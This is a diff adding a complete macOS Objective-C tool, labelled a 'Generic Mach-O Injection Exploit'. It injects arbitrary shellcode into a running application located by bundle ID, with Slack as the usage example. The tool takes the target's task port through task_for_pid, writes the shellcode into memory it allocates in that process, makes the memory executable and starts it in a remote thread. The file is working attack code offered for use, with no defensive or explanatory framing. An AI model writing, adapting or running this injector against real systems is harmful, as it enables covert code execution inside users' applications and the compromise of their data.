@@ -1,0 +1,194 @@
+#import <Foundation/Foundation.h>
+#import <AppKit/AppKit.h>
+#include <mach/mach_vm.h>
+#include <sys/sysctl.h>
+#include <string.h>
+
+#define STACK_SIZE 0x1000
+#define MAX_SHELLCODE_SIZE 4096
+
+// Function to extract bundle ID from app bundle
+NSString* getBundleIdentifier(NSString* appPath) {
+    NSString* infoPlistPath = [appPath stringByAppendingPathComponent:@"Contents/Info.plist"];
+    NSDictionary* infoPlist = [NSDictionary dictionaryWithContentsOfFile:infoPlistPath];
+    
+    if (!infoPlist) {
+        printf("[-] Failed to read Info.plist from %s\n", [appPath UTF8String]);
+        exit(-1);
+    }
+    
+    NSString* bundleId = [infoPlist objectForKey:@"CFBundleIdentifier"];
+    if (!bundleId) {
+        printf("[-] No bundle identifier found in Info.plist\n");
+        exit(-1);
+    }
+    
+    printf("[+] Found bundle identifier: %s\n", [bundleId UTF8String]);
+    return bundleId;
+}
+
+// Function to read shellcode from file
+NSData* readShellcodeFromFile(NSString* filePath) {
+    NSData* shellcodeData = [NSData dataWithContentsOfFile:filePath];
+    
+    if (!shellcodeData) {
+        printf("[-] Failed to read shellcode file: %s\n", [filePath UTF8String]);
+        exit(-1);
+    }
+    
+    if ([shellcodeData length] > MAX_SHELLCODE_SIZE) {
+        printf("[-] Shellcode file too large (max %d bytes)\n", MAX_SHELLCODE_SIZE);
+        exit(-1);
+    }
+    
+    printf("[+] Read shellcode from file: %s (%lu bytes)\n", [filePath UTF8String], (unsigned long)[shellcodeData length]);
+    return shellcodeData;
+}
+
+pid_t get_pid(NSString* bundle_id) {
+    pid_t pid = 0;
+    // Find applications with bundle ID
+    NSArray *runningApplications = [NSRunningApplication runningApplicationsWithBundleIdentifier:bundle_id];
+    // Check if any found at all
+    if (runningApplications.count > 0) {
+        for (id app in runningApplications) {
+            pid = [app processIdentifier];   
+            return pid;
+        }
+    }
+    // If we got here, it means that we didn't find an instance
+    printf("[-] There is no instance of the application running as user, exiting...\n");
+    exit(-1);
+}
+
+void printUsage(const char* programName) {
+    printf("Usage: %s <app_path> <shellcode_file>\n", programName);
+    printf("  app_path:        Path to the target application bundle (e.g., /Applications/Slack.app)\n");
+    printf("  shellcode_file:  Path to the file containing shellcode\n");
+    printf("\nExample: %s /Applications/Slack.app ./shellcode.bin\n", programName);
+    printf("\nNote: This exploit requires root privileges to get task ports\n");
+}
+
+int main(int argc, const char * argv[]) {
+    // Check command line arguments
+    if (argc != 3) {
+        printUsage(argv[0]);
+        return -1;
+    }
+    
+    NSString* appPath = [NSString stringWithUTF8String:argv[1]];
+    NSString* shellcodePath = [NSString stringWithUTF8String:argv[2]];
+    
+    printf("[+] Generic Mach-O Injection Exploit\n");
+    printf("[+] Target app: %s\n", [appPath UTF8String]);
+    printf("[+] Shellcode file: %s\n", [shellcodePath UTF8String]);
+    
+    // Check if app bundle exists
+    BOOL isDirectory;
+    if (![[NSFileManager defaultManager] fileExistsAtPath:appPath isDirectory:&isDirectory] || !isDirectory) {
+        printf("[-] App bundle does not exist or is not a directory: %s\n", [appPath UTF8String]);
+        return -1;
+    }
+    
+    // Extract bundle identifier
+    NSString* bundleId = getBundleIdentifier(appPath);
+    
+    // Read shellcode from file
+    NSData* shellcodeData = readShellcodeFromFile(shellcodePath);
+    const char* shellcode = [shellcodeData bytes];
+    size_t shellcodeSize = [shellcodeData length];
+    
+    // Get process ID
+    pid_t pid = get_pid(bundleId);
+    printf("[+] Found running process with PID: %d\n", pid);
+
+    // Get task port
+    task_t remoteTask;
+    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+          
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to get task port for pid:%d, error: %s\n", pid, mach_error_string(kr));
+        printf("[-] Note: This exploit requires root privileges\n");
+        return(-1);
+    } else {
+        printf("[+] Got access to the task port of process: %d\n", pid);
+    }
+    
+    // Allocate memory for stack and code
+    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+
+    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to allocate stack memory in remote thread, error: %s\n", mach_error_string(kr));
+        exit(-1);
+    } else {
+        printf("[+] Allocated remote stack: 0x%llx\n", remoteStack64);
+    }
+
+    kr = mach_vm_allocate(remoteTask, &remoteCode64, shellcodeSize, VM_FLAGS_ANYWHERE);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to allocate code memory in remote thread, error: %s\n", mach_error_string(kr));
+        exit(-1);
+    } else {
+        printf("[+] Allocated remote code placeholder: 0x%llx\n", remoteCode64);
+    }
+    
+    // Write shellcode to remote process
+    kr = mach_vm_write(remoteTask, remoteCode64, (vm_address_t) shellcode, shellcodeSize);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to write into remote thread memory, error: %s\n", mach_error_string(kr));
+        exit(-1);
+    }
+    
+    // Set memory permissions for code (readable and executable)
+    kr = vm_protect(remoteTask, remoteCode64, shellcodeSize, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[!] Failed to give injected code memory proper permissions, error: %s\n", mach_error_string(kr));
+        exit(-1);
+    }
+
+    // Set memory permissions for stack (readable and writable)
+    kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[!] Failed to give stack memory proper permissions, error: %s\n", mach_error_string(kr));
+        exit(-1);
+    }
+
+    // Set up thread state
+    struct arm_unified_thread_state remoteThreadState64;
+
+    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));
+    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+
+    // Shift stack to middle of allocated region
+    remoteStack64 += (STACK_SIZE / 2);
+
+    // Set remote instruction pointer to our shellcode
+    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+
+    // Set remote stack pointer
+    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+    printf("[+] Remote Stack 64: 0x%llx, Remote code: 0x%llx\n", remoteStack64, remoteCode64);
+
+    // Create and start remote thread
+    thread_act_t remoteThread;
+
+    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT, &remoteThread);
+
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Exploit failed: error: %s\n", mach_error_string(kr));
+        return (-1);
+    }
+    
+    printf("[+] Exploit succeeded! Injected shellcode into process %d\n", pid);
+    printf("[+] Shellcode execution started in remote thread\n");
+    return 0;
+}
